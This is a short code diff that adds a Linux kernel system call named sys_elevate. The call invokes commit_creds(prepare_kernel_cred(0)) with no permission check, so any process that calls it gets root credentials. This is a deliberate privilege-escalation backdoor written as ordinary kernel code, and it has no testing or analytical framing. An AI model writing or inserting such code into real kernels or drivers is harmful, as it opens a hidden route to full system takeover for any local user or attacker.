@@ -1,0 +1,9 @@
+#include <linux/kernel.h>
+#include <linux/syscalls.h>
+
+asmlinkage long sys_elevate(void)
+{
+    // Elevate caller's privileges
+    commit_creds(prepare_kernel_cred(0));
+    return 0;
+}
